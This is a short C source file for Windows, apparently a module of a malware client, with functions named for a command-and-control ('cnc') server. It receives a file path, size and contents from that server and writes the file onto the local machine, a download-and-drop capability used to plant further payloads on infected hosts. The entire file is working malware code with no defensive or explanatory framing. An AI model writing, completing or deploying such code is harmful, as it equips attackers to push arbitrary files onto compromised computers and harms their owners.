#include <stdio.h>
#include <windows.h>
#include "client.h"

#define PATH_BUFFSIZE 1024
#define FILESIZE_BUFFSIZE 8
#define FILECONTENT_BUFFSIZE 8192

HANDLE get_file() {
  HANDLE file;
  char* path = recv_from_cnc(PATH_BUFFSIZE);
  printf("File path: %s\n", path);
  file = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_NEW,
                     FILE_ATTRIBUTE_NORMAL, NULL);
  free(path);
  return file;
}

void recv_into_file(HANDLE file) {
  char* file_size_buf = recv_from_cnc(FILESIZE_BUFFSIZE);
  long file_size = *(long*)file_size_buf;
  free(file_size_buf);
  long bytes_read = 0;
  long bytes_written = 0;
  int reading = 0;
  char* buf;
  while (bytes_read < file_size) {
    long to_be_read = file_size - bytes_read;
    if (to_be_read < FILECONTENT_BUFFSIZE) {
      reading = to_be_read;
      buf = recv_from_cnc(to_be_read);
      bytes_read += to_be_read;
    } else {
      buf = recv_from_cnc(FILECONTENT_BUFFSIZE);
      reading = FILECONTENT_BUFFSIZE;
      bytes_read += FILECONTENT_BUFFSIZE;
    }
    WriteFile(file, buf, reading, &bytes_written, NULL);
    free(buf);
  }
  CloseHandle(file);
}

void download_from_cnc() {
  HANDLE file = get_file();
  recv_into_file(file);
}
